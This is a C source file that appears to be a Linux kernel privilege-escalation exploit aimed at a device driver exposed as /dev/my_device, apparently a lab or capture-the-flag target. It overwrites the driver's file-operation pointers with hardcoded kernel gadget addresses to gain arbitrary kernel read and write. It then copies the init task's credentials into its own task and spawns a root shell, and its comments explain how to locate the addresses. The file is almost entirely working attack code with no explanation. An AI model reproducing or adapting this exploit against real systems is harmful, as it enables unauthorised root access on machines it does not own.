#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <asm/unistd_64.h>

static int fd;

static unsigned long load_from_rsi = 0xffffffff81092e55UL;
static unsigned long store_rsi_to_r8 = 0xffffffff813d0ed0UL;
static unsigned long find_task_by_vpid = 0xffffffff810aedb8UL;
static unsigned long my_write = 0xffffffffc05620d0UL;

//grep my_write /proc/kallsyms
//gdb /usr/lib/debug/lib/modules/uname -r/vmlinux /proc/kcore

static struct {
    char pad [96];
    unsigned long owner;
    unsigned long llseek;
    unsigned long read;
    unsigned long write;
    unsigned long aio_read;
    unsigned long aio_write;
    unsigned long readdir;
    unsigned long poll;
    unsigned long unlocked_ioctl;
    unsigned long compact_ioctl;
    unsigned long mmap;
    unsigned long open;
    unsigned long flush;
    unsigned long release;
    unsigned long fsync;
    unsigned long aio_fsync;
    unsigned long fasync;
    unsigned long lock;
    unsigned long sendpage;
    unsigned long get_unmapped_area;
    unsigned long check_flags;
} pwndata;

static void setfn(unsigned long fn) {
    pwndata.llseek = fn;
    pwndata.write = my_write;
    pwndata.check_flags = find_task_by_vpid;
    write(fd, &pwndata, sizeof(pwndata));
}

static unsigned long kern_load(unsigned long addr) {
    setfn(load_from_rsi);
    return syscall(__NR_lseek, fd, addr, 0);
}

static void kern_store(unsigned long value, unsigned long addr) {
    setfn(store_rsi_to_r8);
    syscall(__NR_lseek, fd, value, 0, 0, addr);
}

int main (int argc) {
    unsigned long task_init;
    unsigned long task_self;
    unsigned long cred_init;

    fd = open("/dev/my_device", O_RDWR);
    
    setfn(load_from_rsi);
    task_init = fcntl(fd, F_SETFL, 1) | 0xffff8800UL << 32;
    task_self = fcntl(fd, F_SETFL, getpid()) | 0xffff8800UL << 32;
    cred_init = kern_load(task_init + 0x670) | 0xffff8800UL << 32;
    kern_store(cred_init, task_self + 0x670);
    close(fd);
    system("/bin/sh");
    return 0;

}